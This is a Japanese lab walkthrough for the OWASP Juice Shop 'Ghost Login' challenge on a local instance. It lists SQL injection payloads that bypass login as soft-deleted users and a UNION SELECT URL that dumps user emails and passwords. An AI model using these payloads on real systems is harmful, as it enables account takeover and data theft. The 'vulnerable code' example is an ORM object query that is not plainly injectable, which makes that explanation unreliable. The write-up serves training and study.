# Ghost Login ❌

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi
**目標:** 削除済み（ゴースト）ユーザーとしてログインする

---

## 思考プロセス

**ステップ1: ゴーストユーザーとは？**
```
「多くのシステムは論理削除（Soft Delete）を採用」
    ↓
「物理的に削除せず、deletedAt タイムスタンプを設定」
    ↓
「通常のログインでは deletedAt が NULL のユーザーのみ対象」
    ↓
「SQLi で条件を変更すれば、削除済みユーザーでログイン可能？」
```

**ステップ2: 通常のログインクエリを推測**
```sql
SELECT * FROM Users 
WHERE email = '{input}' 
AND password = '{hash}' 
AND deletedAt IS NULL
```

**ステップ3: SQLi で条件を変更**
```sql
-- 入力: ' OR deletedAt IS NOT NULL--
SELECT * FROM Users 
WHERE email = '' OR deletedAt IS NOT NULL--' 
AND password = '{hash}' 
AND deletedAt IS NULL

-- 結果: deletedAt が設定されている（削除済み）ユーザーを取得
```

## 削除済みユーザーの確認

```sql
-- SQLi で削除済みユーザーを確認
')) UNION SELECT id,email,deletedAt,4,5,6,7,8,9 FROM users WHERE deletedAt IS NOT NULL--
```

## 実行手順

1. **通常のSQLiでユーザー一覧を取得**
   ```
   URL: http://localhost:3000/rest/products/search?q=')) UNION SELECT id,email,password,deletedAt,5,6,7,8,9 FROM users--
   ```

2. **deletedAt が NOT NULL のユーザーを探す**
   - 削除済みユーザーのメールアドレスを確認

3. **ゴーストログインを実行**
   - ログインページにアクセス
   - メールアドレス: `' OR deletedAt IS NOT NULL--`
   - パスワード: 任意（無視される）

4. **または特定ユーザーとしてログイン**
   ```
   メールアドレス: ghost@juice-sh.op'--
   パスワード: 任意
   ```

## ペイロードバリエーション

```sql
-- 基本形
' OR deletedAt IS NOT NULL--

-- 特定ユーザー
ghost@juice-sh.op' AND deletedAt IS NOT NULL--

-- 最初の削除済みユーザー
' OR deletedAt IS NOT NULL ORDER BY deletedAt LIMIT 1--

-- パスワードチェックをバイパス
' OR 1=1 AND deletedAt IS NOT NULL--
```

## 検証ポイント

- [ ] 削除済みユーザーが存在するか確認
- [ ] SQLi でログインフォームをバイパス
- [ ] ゴーストユーザーとしてログイン成功
- [ ] チャレンジ完了を確認

## なぜこの攻撃が成功するか

```javascript
// 脆弱なコード例
const user = await User.findOne({
  where: {
    email: req.body.email,  // SQLi に脆弱
    deletedAt: null
  }
});
```

## 対策

- プリペアドステートメント/パラメータ化クエリ
- ORM の正しい使用
- 入力検証

## 関連チャレンジ

- [Login Admin](../difficulty-2/login-admin.md) - SQLi の基本
- [Login Jim](login-jim.md) - 特定ユーザーへの SQLi
- [GDPR Data Erasure](gdpr-data-erasure.md) - 論理削除

## 解説

[未着手]
